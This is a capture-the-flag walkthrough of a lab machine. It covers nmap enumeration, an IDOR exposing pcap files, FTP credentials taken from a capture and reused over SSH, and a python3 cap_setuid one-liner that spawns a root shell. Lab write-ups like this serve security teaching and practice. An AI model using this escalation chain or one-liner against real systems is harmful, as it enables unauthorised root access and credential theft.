Boot up the machine and enumerate using nmap.

```bash
sudo nmap -sS -sV -sC -T5 10.10.10.245 -oN nmap-scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 06:05 EDT
Warning: 10.10.10.245 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.245
Host is up (0.35s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.71 seconds
```
Nice, let's check out FTP first, but FTP anonymous login is not allowed, oops, let's visit the web page then.

On the web-page we can see a security dashboard, and peek into .pcap files.

```link
http://10.10.10.245/data/10
```

Intresting, this is a basic IDOR, we can snoop onto other, .pcaps files too.

The pcap file at /0 looks intresting.

This .pcap file contains details for ftp login, using it to log onto FTP.

```ftp
ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||25941|)
150 Here comes the directory listing.
-rwxrwxr-x    1 1001     1001       956174 Jul 13 05:18 linpeas.sh
drwxr-xr-x    3 1001     1001         4096 Jul 13 05:26 snap
-r--------    1 1001     1001           33 Jul 13 00:33 user.txt
226 Directory send OK.
```
With these creds we get the user flag, lest reuse these creds for ssh.

Those credentials are reusable, and we already have ssh on the machine, run it to find the possible exploitable permissions.

Linpeas do give us a very intrsting result,
```bash
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

We can exploit the machine with python.

Exploit (let's change our UID to 0, effectively making us root.):
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

And boom, we are root.
```
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cd /root
# ls
root.txt  snap
```
